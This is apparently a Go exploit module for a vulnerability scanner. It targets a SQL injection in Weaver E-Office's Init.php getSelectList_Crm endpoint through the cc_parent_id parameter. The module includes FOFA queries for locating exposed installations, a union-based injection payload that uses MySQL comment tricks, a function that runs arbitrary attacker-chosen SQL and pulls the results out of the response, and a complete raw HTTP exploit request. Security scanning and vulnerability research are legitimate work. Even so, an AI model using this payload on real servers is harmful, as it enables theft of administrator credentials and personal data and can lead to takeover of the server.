package exploits

import (
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office Init.php getSelectList_Crm SQL Injection Vulnerability",
    "Description": "<p>Weaver E-Office is an OA product launched by Weaver Company for small and medium-sized organizations.</p><p>There is a SQL injection vulnerability in the cc_parent_id parameter sent by Weaver e-office via POST when passing ?m=getSelectList_Crm to the /E-mobile/App/Init.php route.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-03-09",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "GobyQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "/*!50000select*/ user()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "泛微 E-office Init.php getSelectList_Crm SQL 注入漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微 E-Office 是泛微公司面向中小型组织推出的 OA 产品。<br></p><p>泛微 E-Office 在向 /E-mobile/App/Init.php 路由传入 ?m=getSelectList_Crm 时 POST 发送 cc_parent_id 参数存在 SQL 注入漏洞。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>除了利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office Init.php getSelectList_Crm SQL Injection Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver E-Office is an OA product launched by Weaver Company for small and medium-sized organizations.</p><p>There is a SQL injection vulnerability in the cc_parent_id parameter sent by Weaver e-office via POST when passing ?m=getSelectList_Crm to the /E-mobile/App/Init.php route.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.e-office.cn/\">https://www.e-office.cn/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-12",
    "PocId": "10881"
}`

	sendPaylaod5e0335c9 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/E-mobile/App/Init.php?m=getSelectList_Crm")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "cc_parent_id=" + url.QueryEscape("-999 /*!50000union*/ /*!50000all*/ /*!50000select*/ 1,("+sql+")"+"#")
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			sql := "/*!50000select*/ 0x" + hex.EncodeToString([]byte(checkStr))
			rsp, err := sendPaylaod5e0335c9(u, sql)
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, sql)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sql" {
				sql := goutils.B2S(ss.Params["sql"])
				rsp, err := sendPaylaod5e0335c9(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if strings.Contains(rsp.Utf8Html, "CC_VALUE") {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html[strings.Index(rsp.Utf8Html, "\"CC_VALUE\":\"")+12 : strings.Index(rsp.Utf8Html, "\"}]")]
				}
				return expResult
			} else {
				expResult.Success = true
				expResult.Output = `漏洞利用数据包如下：

POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 153
Content-Type: application/x-www-form-urlencoded
Connection: close

cc_parent_id=-999+%2F%2A%2150000union%2A%2F+%2F%2A%2150000all%2A%2F+%2F%2A%2150000select%2A%2F+1%2C%28%2F%2A%2150000select%2A%2F+0x4141423339413141%29%23`
				return expResult
			}
		},
	))
}